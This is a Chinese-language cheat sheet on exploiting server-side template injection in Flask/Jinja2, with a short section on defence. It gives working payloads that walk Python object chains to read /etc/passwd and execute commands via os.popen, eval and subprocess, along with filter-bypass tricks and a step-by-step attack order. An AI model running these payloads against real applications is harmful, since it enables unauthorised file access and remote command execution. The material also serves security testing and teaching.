# EXP手册-服务端模板注入（SSTI）

## 一句话理解
Python 场景下的 SSTI 以 Flask/Jinja2 最常见，核心是攻击者通过模板表达式进入 Python 对象体系，逐步访问类、全局变量、内置函数与模块，最终实现文件读取或命令执行。

## 常见场景
- Flask `render_template_string()`
- Jinja2 动态模板
- 后台自定义模板、邮件模板、页面片段
- 调试页、错误页、预览页

## 基础判断
可先用：

```text
{{7*7}}
```

若返回 `49`，通常说明进入了模板表达式执行。

入门资料：
- [flask 之 SSTI 模板注入从零到入门](https://xz.aliyun.com/t/3679)

## 核心利用思路
典型路径是：
1. 确认表达式可执行
2. 获取基础类或对象根节点
3. 进入类继承链和子类列表
4. 找到可访问的函数、全局变量、模块
5. 实现文件读取或命令执行

## 获取基础类
常见写法：

```python
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[8]
```

当中括号被过滤时，可借助 `__getitem__`：

```python
''.__class__.__mro__.__getitem__(2)
{}.__class__.__bases__.__getitem__(0)
().__class__.__bases__.__getitem__(0)
request.__class__.__mro__.__getitem__(8)
```

常见属性说明：

```text
__class__：获得当前对象的类
__bases__：列出其基类
__mro__：方法解析顺序
__subclasses__()：返回子类列表
__dict__：当前属性/函数字典
func_globals / __globals__：函数全局变量
```

## 文件操作
> 注意：不同 Python 版本、不同运行环境中，`__subclasses__()` 的索引不固定，不能机械套用。

示例思路中，原文以 Python 2 为例：

```python
object.__subclasses__()[40]('/etc/passwd').read()
object.__subclasses__()[40]('/tmp').write('test')
```

实战要点：
- 先确认当前 Python 版本
- 先枚举子类，再定位文件相关类
- 不要假设索引在不同环境中稳定一致

## 执行命令
### 1. 借助 `func_globals` / `__globals__`
原文示例：

```python
object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
```

或通过内置函数：

```python
object.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
object.__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
object.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()
```

### 2. 常见高危函数与模块
以下对象一旦可达，通常具备较高利用价值：

#### `os`

```python
import os
os.system('ipconfig')
```

#### `exec`

```python
exec('__import__("os").system("ipconfig")')
```

#### `eval`

```python
eval('__import__("os").system("ipconfig")')
```

#### `timeit`

```python
import timeit
timeit.timeit("__import__('os').system('ipconfig')", number=1)
```

#### `platform`

```python
import platform
platform.popen('ipconfig').read()
```

#### `subprocess`

```python
import subprocess
subprocess.Popen('ipconfig', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()
```

#### 文件读取函数

```python
file('/etc/passwd').read()
open('/etc/passwd').read()
```

```python
import codecs
codecs.open('/etc/passwd').read()
```

## Fuzz 与上下文探测
可先观察模板上下文里有哪些对象暴露出来：

```python
{{config}}
{{handler.settings}}
{{app.__init__.__globals__.sys.modules.app.app.__dict__}}
```

常见请求对象入口：
- GET：`request.args`
- Cookies：`request.cookies`
- Headers：`request.headers`
- Environment：`request.environ`
- Values：`request.values`

## 常见绕过思路
- [Jinja2 template injection filter bypasses](https://0day.work/jinja2-template-injection-filter-bypasses/)
- [SSTI Bypass 分析](https://www.secpulse.com/archives/115367.html)

常见绕过点：
- 中括号过滤，改用 `__getitem__`
- 点号过滤，改用属性函数或其他访问方式
- 关键字过滤，改用字符串拼接、编码或对象间接访问
- 黑名单只拦截少数危险单词，但未阻断对象图遍历

## 实战排查思路
### 1. 先确认是不是 Python SSTI
结合：
- 报错栈
- Flask / Jinja2 特征
- 模板语法
- 响应中的对象名称

### 2. 先做最小求值
例如 `{{7*7}}`，确认不是普通字符串回显。

### 3. 再做对象图遍历
优先寻找：
- `config`
- `request`
- `self`
- `app`
- 可达函数对象

### 4. 最后再打命令执行
先文件读、环境变量读，再看是否存在稳定的命令执行链。

## 防御要点
### 1. 不要把用户输入当模板源码
只能作为变量渲染，不能直接喂给模板解释器。

### 2. 避免动态字符串渲染
谨慎使用 `render_template_string()` 等接口处理不可信输入。

### 3. 启用沙箱并限制对象暴露
不要把请求对象、应用对象、内置模块直接暴露给模板。

### 4. 不依赖黑名单
只过滤 `__class__`、`os`、`eval` 等关键字，通常挡不住对象链绕过。

## 速查清单
- 先测 `{{7*7}}` 判断是否存在求值
- 再找 `config`、`request`、`app`、`self`
- 再利用 `__class__`、`__mro__`、`__subclasses__()` 向对象根节点扩展
- 关注 Python 版本和子类索引差异
- 优先做文件读取，其次再构造稳定命令执行

## Reference
- [Flask/Jinja2 SSTI && python 沙箱逃逸](https://www.kingkk.com/2018/06/Flask-Jinja2-SSTI-python-%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/)
- [Flask/Jinja2 模板注入中的一些绕过姿势](https://p0sec.net/index.php/archives/120/)
